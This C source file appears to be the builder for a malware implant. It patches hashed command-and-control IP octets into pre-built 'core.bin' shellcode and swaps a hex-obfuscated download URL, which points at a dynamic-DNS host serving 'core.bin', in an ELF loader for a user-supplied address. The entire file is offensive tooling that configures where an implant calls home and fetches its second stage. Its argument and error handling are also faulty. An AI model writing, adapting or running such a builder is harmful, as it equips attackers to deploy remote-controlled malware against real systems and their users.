#include <stdio.h>
#include <stdint.h>
#include <string.h>

extern unsigned int gostGetNumberHash(unsigned int number);

void write_little_endian(unsigned char *dest, unsigned int value) {
    dest[0] = value & 0xFF;
    dest[1] = (value >> 8) & 0xFF;
    dest[2] = (value >> 16) & 0xFF;
    dest[3] = (value >> 24) & 0xFF;
}

int generateLoader(char loaderStr[]){
    unsigned char curlPattern[] = {0x68,0x74,0x74,0x70,0x3A,0x2F,0x2F,0x76,0x65,0x6E,0x65,0x78,0x34,0x66,0x39,0x61,0x37,0x62,0x32,0x63,0x31,0x64,0x38,0x65,0x33,0x66,0x36,0x67,0x30,0x68,0x35,0x6A,0x32,0x6B,0x39,0x6C,0x31,0x6D,0x37,0x6E,0x38,0x6F,0x2E,0x64,0x75,0x63,0x6B,0x64,0x6E,0x73,0x2E,0x6F,0x72,0x67,0x3A,0x35,0x30,0x30,0x30,0x2F,0x63,0x6F,0x72,0x65,0x2E,0x62,0x69,0x6E};

    FILE* file = fopen("../../gostInit/bin/loader", "rb");
    if (!file) {
        perror("[-] Failed to open .bin");
    }
    unsigned char file_buffer[8000];
    size_t bytes_read = fread(file_buffer, 1, sizeof(file_buffer), file);
    fclose(file);

    for(int i=0; i < bytes_read; i++){
        if(memcmp(&file_buffer[i], curlPattern, 32) == 0){

            sscanf(loaderStr, "%s", &file_buffer[i]);
        }
    }

    file = fopen("../../xMain/loader/elfLoader", "wb");
    if (!file) {
        perror("[-] Failed to open .bin");
    }

    size_t bytes_written = fwrite(file_buffer, 1, bytes_read, file);
    fclose(file);
    if (bytes_written != bytes_read) {
        perror("[-] Failed to write all bytes");
    }

}

int generateCore(unsigned int IP1, unsigned int IP2, unsigned int IP3, unsigned int IP4){

    unsigned char patternIP1[] = {0x41, 0xBF, 0x14, 0x00, 0x00, 0xA0, 0xE8};
    unsigned char patternIP2[] = {0x41, 0xBF, 0x00, 0xE8, 0x00, 0x00, 0xE8};
    unsigned char patternIP3[] = {0x41, 0xBF, 0x00, 0x00, 0xB8, 0x06, 0xE8};
    unsigned char patternIP4[] = {0x41, 0xBF, 0x31, 0x00, 0x00, 0x80, 0xE8};

    FILE* file = fopen("../../gostInit/bin/core.bin", "rb+");
    if (!file) {
        perror("[-] Failed to open .bin");
    }
    unsigned char file_buffer[7000];
    size_t bytes_read = fread(file_buffer, 1, sizeof(file_buffer), file);
    fclose(file);

    for(int i=0; i < bytes_read; i++){
        if(memcmp(&file_buffer[i], patternIP1, 7) == 0){
            write_little_endian(&file_buffer[i + 3], IP1);
        }
        if(memcmp(&file_buffer[i], patternIP2, 7) == 0){
            write_little_endian(&file_buffer[i + 3], IP2);
        }
        if(memcmp(&file_buffer[i], patternIP3, 7) == 0){
            write_little_endian(&file_buffer[i + 3], IP3);
        }
        if(memcmp(&file_buffer[i], patternIP4, 7) == 0){
            write_little_endian(&file_buffer[i + 3], IP4);
        }
    }

    file = fopen("../../xMain/core/core.bin", "wb");
    if (!file) {
        perror("[-] Failed to open .bin");
    }

    size_t bytes_written = fwrite(file_buffer, 1, bytes_read, file);
    fclose(file);
    if (bytes_written != bytes_read) {
        perror("[-] Failed to write all bytes");
    }
}


int main(int argc, char *argv[]){
    

    char *ip = argv[1];



    unsigned int IP1,IP2,IP3,IP4;
    if (sscanf(ip, "%u.%u.%u.%u", &IP1, &IP2, &IP3, &IP4) != 4) {
        printf("[-] Invalid IP format.\n");
        return 1;
    }

    //create hash for each ip parts
    IP1 = gostGetNumberHash(IP1);
    IP2 = gostGetNumberHash(IP2);
    IP3 = gostGetNumberHash(IP3);
    IP4 = gostGetNumberHash(IP4);

    //inject ip into core
    printf("Generating core ...\n");
    generateCore(IP1, IP2, IP3, IP4);
    printf("core Generated at /xMain/core/core.bin\n");
    //creating loader testing loader
    printf("Generating test/debug elfLoader ...\n");

    if(argc < 2){
        return 1;
    }
    
    char *loaderStr = argv[2];
    generateLoader(loaderStr);
    printf("test/debug elfLoader Generated  at /xMain/loader/elfLoader\n");


}